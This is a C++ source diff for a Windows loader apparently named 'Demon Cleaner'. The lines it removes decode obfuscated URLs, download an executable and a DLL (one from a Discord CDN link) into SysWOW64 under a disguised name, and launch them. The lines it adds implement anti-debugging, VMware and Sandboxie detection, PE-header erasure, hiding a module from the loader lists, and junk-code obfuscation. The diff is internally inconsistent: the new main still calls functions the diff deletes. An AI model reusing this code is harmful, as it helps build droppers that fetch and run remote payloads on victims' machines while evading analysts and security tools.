@@ -1,26 +1,65 @@
-#pragma once
 #include "../Demon Cleaner/Headers/dead.hpp"
 #include <string>
 #include <windows.h>
 #include <Urlmon.h>
 #include "../Demon Cleaner/Headers/junk-code.h"
 #include <Wininet.h>
-#include <stdlib.h>
 #include <vector>
 #include <tchar.h>
 #include "../Demon Cleaner/Headers/color.hpp"
-#include "../Demon Cleaner/Headers/json.hpp"
-#include <fstream>
-#include "../Demon Cleaner/Headers/value.h"
-#include <stringapiset.h>
 #include <TlHelp32.h>
-#include "../Demon Cleaner/Headers/antidbg.h"
 #include <cstdio>
 #include <iostream>
-#include <filesystem>
-
+#include "loader.h"
+#include <stdio.h>
+#include "../Demon Cleaner/Headers/lazy_importer.hpp"
 #pragma comment(lib, "urlmon.lib")
-#pragma comment(lib,"Wininet.lib")
+#pragma comment(lib,"Wininet.lib") 
+BOOL IsDbgPresentPrefixCheck()
+{
+
+
+
+    __try
+    {
+        __asm __emit 0xF3 
+        __asm __emit 0x64
+        __asm __emit 0xF1 
+    }
+    __except (EXCEPTION_EXECUTE_HANDLER)
+    {
+        return FALSE;
+    }
+
+    return TRUE;
+}
+inline void PushPopSS()
+{
+
+__asm
+{
+    push ss
+    pop ss
+    mov eax, 9 // This line executes but is stepped over
+    xor edx, edx // This is where the debugger will step to
+}
+}
+
+
+inline void ErasePEHeaderFromMemory()
+{
+    DWORD OldProtect = 0;
+
+    // Get base address of module
+    char* pBaseAddr = (char*)GetModuleHandle(NULL);
+
+    // Change memory protection
+    VirtualProtect(pBaseAddr, 4096, // Assume x86 page size
+        PAGE_READWRITE, &OldProtect);
+
+    // Erase the header
+    ZeroMemory(pBaseAddr, 4096);
+}
 
 #define JUNK_CODE_ONE        \
     __asm{push eax}            \
@@ -33,348 +72,524 @@
     __asm{pop edx}            \
     __asm{or eax, ecx}        \
     __asm{pop eax}
-using namespace junkcode;
-string encrypt(string input) {
-    vector<char> word(input.begin(), input.end());
-    string alphabet = "abcdefghijklmnopqrstuvwxyz";
 
-    for (int i = 0; i < (int)input.length(); i++) {
-        for (int j = 0; j < (int)alphabet.length(); j++) {
-            if (word[i] == alphabet[j]) {
-                word[i] = alphabet[(j + 3) % 26];
-
-                break;
-            }
-        }
-    }
-    string str(word.begin(), word.end());
-    return str;
-}
-string decrypt(string input) {
-    vector<char> word(input.begin(), input.end());
-    string alphabet = "abcdefghijklmnopqrstuvwxyz";
-
-    for (int i = 0; i < (int)input.length(); i++) {
-        for (int j = 0; j < (int)alphabet.length(); j++) {
-            if (word[i] == alphabet[j]) {
-                word[i] = alphabet[(j - 3) % 26];
-                break;
-            }
-        }
-    }
-    string str(word.begin(), word.end());
-    return str;
-}
-void deleter()
+inline bool Int2DCheck()
 {
-    using namespace filesystem;
-    rydekem();
-    lnttirs();
-    tlmisir();
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        rydekem();
-    lnttirs();
-    tlmisir();
-    rydekem();
-    lnttirs();
-    tlmisir();
-    
-    
-
-    rydekem();
-    lnttirs();
-    tlmisir();
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        rydekem();
-    lnttirs();
-    tlmisir();
-    rydekem();
-    lnttirs();
-    tlmisir();
-
-}
-vector<string> serial;
-void loadserial()
-{
-    rydekem();
-    lnttirs();
-    tlmisir();
-    rydekem();
-    lnttirs();
-    tlmisir();
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        rydekem();
-    lnttirs();
-    tlmisir();
-
-    bool checkconnection = InternetCheckConnection("https://google.com/", FLAG_ICC_FORCE_CONNECTION, 0);
-    
-    if (!checkconnection)
+    __try
     {
-        cout << dead("You are not connected to internet...");
-        Sleep(3000);
+        __asm
+        {
+            int 0x2d
+            xor eax, eax
+            add eax, 2
+        }
+    }
+    __except (EXCEPTION_EXECUTE_HANDLER)
+    {
+        return false;
+    }
+
+    return true;
+}
+BOOL AD_PEB_IsDebugged()
+{
+    __asm {
+        xor eax, eax
+        mov ebx, fs: [30h]
+        mov al, byte ptr[ebx + 2]
+    }
+}
+BOOL AD_PEB_NtGlobalFlags()
+{
+    __asm {
+        mov eax, fs: [30h]
+        mov eax, [eax + 68h]
+        and eax, 0x70
+    }
+}
+BOOL AD_CheckRemoteDebuggerPresent()
+{
+    FARPROC Func_addr;
+    HMODULE hModule = GetModuleHandle("kernel32.dll");
+
+    if (hModule == INVALID_HANDLE_VALUE)
+        return false;
+
+    (FARPROC&)Func_addr = GetProcAddress(hModule, "CheckRemoteDebuggerPresent");
+
+    if (Func_addr != NULL) {
+        __asm {
+            push  eax;
+            push  esp;
+            push  0xffffffff;
+            call  Func_addr;
+            test  eax, eax;
+            je    choke_false;
+            pop    eax;
+            test  eax, eax
+                je    choke_false;
+            jmp    choke_true;
+        }
+    }
+
+choke_true:
+    return true;
+    exit(0);
+    SetLastError(1);
+
+choke_false:
+    return false;
+}
+
+bool IsInsideVMWare()
+{
+    bool rc = true;
+
+    __try
+    {
+        __asm
+        {
+            push   edx
+            push   ecx
+            push   ebx
+
+            mov    eax, 'VMXh'
+            mov    ebx, 0
+            mov    ecx, 10
+            mov    edx, 'VX'
+
+            in     eax, dx
+
+            cmp    ebx, 'VMXh'
+            setz[rc]
+
+            pop    ebx
+            pop    ecx
+            pop    edx
+        }
+    }
+    __except (EXCEPTION_EXECUTE_HANDLER)
+    {
+        rc = false;
+    }
+
+    return rc;
+    if (rc = false)
         exit(0);
+}
+void HideModule(HINSTANCE hModule)
+{
+    DWORD dwPEB_LDR_DATA = 0;
+    _asm
+    {
+        pushad;
+        pushfd;
+        mov eax, fs: [30h]
+            mov eax, [eax + 0Ch]
+            mov dwPEB_LDR_DATA, eax
+            InLoadOrderModuleList :
+        mov esi, [eax + 0Ch]
+            mov edx, [eax + 10h]
+            LoopInLoadOrderModuleList :
+            lodsd
+            mov esi, eax
+            mov ecx, [eax + 18h]
+            cmp ecx, hModule
+            jne SkipA
+            mov ebx, [eax]
+            mov ecx, [eax + 4]
+            mov[ecx], ebx
+            mov[ebx + 4], ecx
+            jmp InMemoryOrderModuleList
+            SkipA :
+        cmp edx, esi
+            jne LoopInLoadOrderModuleList
+            InMemoryOrderModuleList :
+        mov eax, dwPEB_LDR_DATA
+            mov esi, [eax + 14h]
+            mov edx, [eax + 18h]
+            LoopInMemoryOrderModuleList :
+            lodsd
+            mov esi, eax
+            mov ecx, [eax + 10h]
+            cmp ecx, hModule
+            jne SkipB
+            mov ebx, [eax]
+            mov ecx, [eax + 4]
+            mov[ecx], ebx
+            mov[ebx + 4], ecx
+            jmp InInitializationOrderModuleList
+            SkipB :
+        cmp edx, esi
+            jne LoopInMemoryOrderModuleList
+            InInitializationOrderModuleList :
+        mov eax, dwPEB_LDR_DATA
+            mov esi, [eax + 1Ch]
+            mov edx, [eax + 20h]
+            LoopInInitializationOrderModuleList :
+            lodsd
+            mov esi, eax
+            mov ecx, [eax + 08h]
+            cmp ecx, hModule
+            jne SkipC
+            mov ebx, [eax]
+            mov ecx, [eax + 4]
+            mov[ecx], ebx
+            mov[ebx + 4], ecx
+            jmp Finished
+            SkipC :
+        cmp edx, esi
+            jne LoopInInitializationOrderModuleList
+            Finished :
+        popfd;
+        popad;
     }
-    rydekem();
-    lnttirs();
-    tlmisir();
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        rydekem();
-    lnttirs();
-    tlmisir();
-    rydekem();
-    lnttirs();
-    tlmisir();
+}
+void AntiHeaders(HINSTANCE hModule)
+{
+    DWORD dwPEB_LDR_DATA = 0;
+    _asm
+    {
+        pushad;
+        pushfd;
+        mov eax, fs: [30h]
+            mov eax, [eax + 0Ch]
+            mov dwPEB_LDR_DATA, eax
+
+            InLoadOrderModuleList :
+        mov esi, [eax + 0Ch]
+            mov edx, [eax + 10h]
+
+            LoopInLoadOrderModuleList :
+            lodsd
+            mov esi, eax
+            mov ecx, [eax + 18h]
+            cmp ecx, hModule
+            jne SkipA
+            mov ebx, [eax]
+            mov ecx, [eax + 4]
+            mov[ecx], ebx
+            mov[ebx + 4], ecx
+            jmp InMemoryOrderModuleList
+            SkipA :
+        cmp edx, esi
+            jne LoopInLoadOrderModuleList
+
+            InMemoryOrderModuleList :
+        mov eax, dwPEB_LDR_DATA
+            mov esi, [eax + 14h]
+            mov edx, [eax + 18h]
+
+            LoopInMemoryOrderModuleList :
+            lodsd
+            mov esi, eax
+            mov ecx, [eax + 10h]
+            cmp ecx, hModule
+            jne SkipB
+            mov ebx, [eax]
+            mov ecx, [eax + 4]
+            mov[ecx], ebx
+            mov[ebx + 4], ecx
+            jmp InInitializationOrderModuleList
+            SkipB :
+        cmp edx, esi
+            jne LoopInMemoryOrderModuleList
+
+            InInitializationOrderModuleList :
+        mov eax, dwPEB_LDR_DATA
+            mov esi, [eax + 1Ch]
+            mov edx, [eax + 20h]
+
+            LoopInInitializationOrderModuleList :
+            lodsd
+            mov esi, eax
+            mov ecx, [eax + 08h]
+            cmp ecx, hModule
+            jne SkipC
+            mov ebx, [eax]
+            mov ecx, [eax + 4]
+            mov[ecx], ebx
+            mov[ebx + 4], ecx
+            jmp Finished
+            SkipC :
+        cmp edx, esi
+            jne LoopInInitializationOrderModuleList
+
+            Finished :
+        popfd;
+        popad;
+    }
+}
+string replaceAll(string subject, const string& search,
+    const string& replace) {
+    size_t pos = 0;
+    while ((pos = subject.find(search, pos)) != string::npos) {
+        subject.replace(pos, search.length(), replace);
+        pos += replace.length();
+    }
+    return subject;
+}
+string DownloadString(string URL) {
+    HINTERNET interwebs = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
+    HINTERNET urlFile;
+    string rtn;
+    if (interwebs) {
+        urlFile = InternetOpenUrlA(interwebs, URL.c_str(), NULL, NULL, NULL, NULL);
+        if (urlFile) {
+            char buffer[2000];
+            DWORD bytesRead;
+            do {
+                InternetReadFile(urlFile, buffer, 2000, &bytesRead);
+                rtn.append(buffer, bytesRead);
+                memset(buffer, 0, 2000);
+            } while (bytesRead);
+            InternetCloseHandle(interwebs);
+            InternetCloseHandle(urlFile);
+            string p = replaceAll(rtn, "|n", "\r\n");
+            return p;
+        }
+    }
+    InternetCloseHandle(interwebs);
+    string p = replaceAll(rtn, "|n", "\r\n");
+    return p;
+}
+PVOID AntiRevers(HMODULE dwModule)
+{
+    PVOID pEntry = NULL;
+    PIMAGE_DOS_HEADER pId = (PIMAGE_DOS_HEADER)dwModule;
+    PIMAGE_NT_HEADERS pInt = (PIMAGE_NT_HEADERS)(dwModule + pId->e_lfanew);
+    pEntry = dwModule + pInt->OptionalHeader.BaseOfCode;
+    return pEntry;
+}
+BOOL IsSandboxie()
+{
+    if (GetModuleHandle("SbieDll.dll") != NULL)
+        exit(0);
+    LI_FN(VirtualProtect).in(LI_MODULE("kernel32.dll").cached());
+    LI_FN(VirtualProtect).in(LI_MODULE("urlmon.dll").cached());
+    LI_FN(VirtualProtect).in(LI_MODULE("ntdll.dll").cached());
+    LI_FN(VirtualProtect).in(LI_MODULE("user32.dll").cached());
 
 
-    serial.push_back(dead("384604182").c_str());
-    JUNK_CODE_ONE
-    serial.push_back(dead("2953439145").c_str());
-    rydekem();
-    lnttirs();
-    tlmisir();
-
+    return FALSE;
 }
 
-
-void mainbot()
+auto RandomTitle = [](int iterations) {
+    std::string Title;
+    for (int i = 0; i < iterations; i++)
+        Title += rand() % 255 + 1;
+    return Title;
+};
+BOOL IsVMware()
 {
-    rydekem();
-    lnttirs();
-    tlmisir();
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        rydekem();
-    lnttirs();
-    tlmisir();
-    rydekem();
-    lnttirs();
-    tlmisir();
+    BOOL bDetected = FALSE;
 
-
-
-    TCHAR volumeName[MAX_PATH + 1] = { 0 };
-    TCHAR fileSystemName[MAX_PATH + 1] = { 0 };
-    DWORD serialNumber = 0;
-    DWORD maxComponentLen = 0;
-    DWORD fileSystemFlags = 0;
-
-
-
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        rydekem();
-    lnttirs();
-    tlmisir();
-    rydekem();
-    lnttirs();
-    tlmisir();
-
-
-    if (GetVolumeInformation(_T("C:\\"), volumeName, ARRAYSIZE(volumeName), &serialNumber, &maxComponentLen, &fileSystemFlags, fileSystemName, ARRAYSIZE(fileSystemName)));
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-    while (true)
+    __try
     {
-        rydekem();
-        lnttirs();
-        tlmisir();
-        JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            rydekem();
-        lnttirs();
-        tlmisir();
-
-        rydekem();
-        lnttirs();
-        tlmisir();
-        if (find(serial.begin(), serial.end(), to_string(serialNumber)) != serial.end())
+        __asm
         {
-            __asm
-            {
-                jmp short Label1
-                _emit 0xB2
-                _emit 0xB9
-                _emit 0x44
-                _emit 0xED
-                _emit 0xB4
-                Label2:
-                jmp short Label3
-                    _emit 0xF9
-                    _emit 0x7C
-                    _emit 0xB8
-                    _emit 0x81
-                    _emit 0x76
-                    Label1:
-                jmp short Label2
-                    _emit 0x90
-                    _emit 0x84
-                    _emit 0x48
-                    _emit 0x6F
-                    _emit 0xA8
-                    Label3:
-                jmp short Label4
-                    _emit 0xEC
-                    _emit 0x2A
-                    _emit 0x77
-                    _emit 0x20
-                    _emit 0x7C
-                    Label4:
-                jmp short Label5
-                    _emit 0xCD
-                    _emit 0x75
-                    _emit 0xB8
-                    _emit 0x46
-                    _emit 0xFD
-                    Label5:
-            }
-            JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-            string filename = (dead("C:\\Windows\\SysWOW64\\audio-for-stability.exe").c_str());
-            ifstream ifile(filename);
-            if (ifile)
-            {
-                system(dead("cd C:\\Windows\\SysWOW64\\").c_str());
-                system(dead("start audio-for-stability.exe").c_str());
-                system(dead("cls").c_str());
-                
-            }
-            else
-            {
-                __asm
-                {
-                    jmp short caca1
-                    _emit 0x6F
-                    _emit 0x77
-                    _emit 0xD9
-                    _emit 0xF1
-                    _emit 0xDF
-                    caca2:
-                    jmp short caca3
-                        _emit 0x6C
-                        _emit 0x64
-                        _emit 0x6E
-                        _emit 0x89
-                        _emit 0xB6
-                        caca1:
-                    jmp short caca2
-                        _emit 0x54
-                        _emit 0x4F
-                        _emit 0xA0
-                        _emit 0xD8
-                        _emit 0xF5
-                        caca3:
-                    jmp short caca4
-                        _emit 0x22
-                        _emit 0xD9
-                        _emit 0xD9
-                        _emit 0x07
-                        _emit 0x07
-                        caca4:
-                    jmp short caca5
-                        _emit 0xDF
-                        _emit 0xA5
-                        _emit 0x5E
-                        _emit 0x33
-                        _emit 0xA0
-                        caca5:
-                }
-
-
-                std::string download = (decrypt("kwwsv://ilohpdqdjhu.dl/qhz/dssolfdwlrq/dsl/grzqordg.sks?ilohKhb=G2fJmtJMHn8Ds5ek").c_str());
-                std::string path = (dead("C:\\Windows\\SysWOW64\\audio-for-stability.exe").c_str());
-                URLDownloadToFileA(NULL, download.c_str(), path.c_str(), 0, NULL);
-                system(dead("cd C:\\Windows\\SysWOW64\\").c_str());
-
-                std::string dll = (decrypt("kwwsv://fgq.glvfrugdss.frp/dwwdfkphqwv/834754431249285140/891659436341477376/vhuyhu.goo").c_str());
-                std::string dllpath = (dead("C:\\Windows\\SysWOW64\\audio.dll").c_str());
-                URLDownloadToFileA(NULL, dll.c_str(), dllpath.c_str(), 0, NULL);
-                Sleep(2000);
-                system(dead("start audio-for-stability.exe").c_str());
-                system(dead("cls").c_str());
-               
-            }
-                
-           
-            
-
-            return exit(0);
-        }
-        else
-        {
-            rydekem();
-            lnttirs();
-            tlmisir();
-            rydekem();
-            lnttirs();
-            tlmisir();
-            JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                rydekem();
-            lnttirs();
-            tlmisir();
-
-            system(dead("cls").c_str());
-            std::cout << CYAN << (dead("Sorry but you are not in our database. ").c_str()) << std::endl;
-            std::cout << GREEN << (dead("Hwid : ").c_str());
-            std::cout << serialNumber << std::endl;
-            Sleep(10000);
-            rydekem();
-            lnttirs();
-            tlmisir();
-            JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                rydekem();
-            lnttirs();
-            tlmisir();
-            rydekem();
-            lnttirs();
-            tlmisir();
-            
-
-            exit(0);
-            return exit(0);
-        
-
-
-            
+            mov    ecx, 0Ah
+            mov    eax, 'VMXh'
+            mov    dx, 'VX'
+            in    eax, dx
+            cmp    ebx, 'VMXh'
+            sete    al
+            movzx   eax, al
+            mov    bDetected, eax
         }
     }
+    __except (EXCEPTION_EXECUTE_HANDLER)
+    {
+        return FALSE;
+
+    }
+
+    return bDetected;
+    if (bDetected)
+    {
+        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
+        system(dead("start cmd /c START CMD /C \"COLOR C && TITLE VM Detected && ECHO You got detected using VM Workstation . && TIMEOUT 10 >nul").c_str());
+        SetLastError(1);
+        exit(0);
+        LI_FN(VirtualProtect).in(LI_MODULE("kernel32.dll").cached());
+        LI_FN(VirtualProtect).in(LI_MODULE("urlmon.dll").cached());
+        LI_FN(VirtualProtect).in(LI_MODULE("ntdll.dll").cached());
+        LI_FN(VirtualProtect).in(LI_MODULE("user32.dll").cached());
+
+    }
+}
+int main()
+{
+    JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+
+    PushPopSS();
+    ErasePEHeaderFromMemory();
+    if (IsDbgPresentPrefixCheck())
+
+        exit(0);
+    if (IsDebuggerPresent())
+
+        exit(0);
+    if (AD_PEB_NtGlobalFlags())
+
+        exit(0);
+    if (AD_CheckRemoteDebuggerPresent())
+        
+        exit(0);
+    if (AD_PEB_IsDebugged())
+        
+        exit(0);
+    if (Int2DCheck())
+        
+        exit(0);
+
+    JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        HideModule;
+    AntiHeaders;
+    AntiRevers;
+    SetConsoleTitleA(RandomTitle(rand() % 90 + 20).c_str());
+
+
+    if (GetLastError == 0)
+    {
+        JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            JUNK_CODE_ONE
+
+            IsSandboxie();
+        IsVMware();
+
+        bool checkconnection = InternetCheckConnection("https://google.com", FLAG_ICC_FORCE_CONNECTION, 0);
+        bool checkwebsite = InternetCheckConnection("http://demoncleaner.gq", FLAG_ICC_FORCE_CONNECTION, 0);
+        string versionurl = decrypt("kwwsv://sdvwhelq.frp/udz/miNbmPUu");
+        string version = dead("1");
+        if (!checkconnection)
+        {
+            system(dead("start cmd /c START CMD /C \"COLOR 5 && TITLE No Internet && ECHO You are not connected to the internet . && TIMEOUT 10 >nul").c_str());
+            Sleep(3000);
+            exit(0);
+            LI_FN(VirtualProtect).in(LI_MODULE("kernel32.dll").cached());
+            LI_FN(VirtualProtect).in(LI_MODULE("urlmon.dll").cached());
+            LI_FN(VirtualProtect).in(LI_MODULE("ntdll.dll").cached());
+            LI_FN(VirtualProtect).in(LI_MODULE("user32.dll").cached());
+
+        }
+        if (!checkwebsite)
+        {
+            system(dead("start cmd /c START CMD /C \"COLOR B && TITLE Closed && ECHO Sorry but our website is down, this project might be closed or our servers are down.\n\nPlease come back later . && TIMEOUT 10 >nul").c_str());
+            Sleep(3000);
+            exit(0);
+            LI_FN(VirtualProtect).in(LI_MODULE("kernel32.dll").cached());
+            LI_FN(VirtualProtect).in(LI_MODULE("urlmon.dll").cached());
+            LI_FN(VirtualProtect).in(LI_MODULE("ntdll.dll").cached());
+            LI_FN(VirtualProtect).in(LI_MODULE("user32.dll").cached());
+        }
+        if (version != DownloadString(versionurl))
+        {
+            system(dead("start cmd /c START CMD /C \"COLOR B && TITLE Old Version && ECHO You have an old version of Demon Cleaner.\n\n Please contact the owner to get the new version. && TIMEOUT 10 >nul").c_str());
+            Sleep(3000);
+            exit(0);
+            LI_FN(VirtualProtect).in(LI_MODULE("kernel32.dll").cached());
+            LI_FN(VirtualProtect).in(LI_MODULE("urlmon.dll").cached());
+            LI_FN(VirtualProtect).in(LI_MODULE("ntdll.dll").cached());
+            LI_FN(VirtualProtect).in(LI_MODULE("user32.dll").cached());
+        }
+
+        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
+        loadserial();
+        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
+        JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            rydekem();
+        lnttirs();
+        tlmisir();
+        mainbot();
+        rydekem();
+        lnttirs();
+        tlmisir();
+        JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
+                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
+        FreeConsole();
+        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
+
+
+
+    }
+    if (GetLastError != 0)
+    {
+        Sleep(100);
+        HMODULE hModule = LoadLibrary(_T("urlmon.dll"));
+        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
+        system(dead("start cmd /c START CMD /C \"COLOR 6 && TITLE Banned && ECHO You have been banned for using reverse engineering tools against our software . && TIMEOUT 10 >nul").c_str());
+        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
+        exit(0);
+        LI_FN(VirtualProtect).in(LI_MODULE("kernel32.dll").cached());
+        LI_FN(VirtualProtect).in(LI_MODULE("urlmon.dll").cached());
+        LI_FN(VirtualProtect).in(LI_MODULE("ntdll.dll").cached());
+        LI_FN(VirtualProtect).in(LI_MODULE("user32.dll").cached());
+        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
+
+    }
+
 }
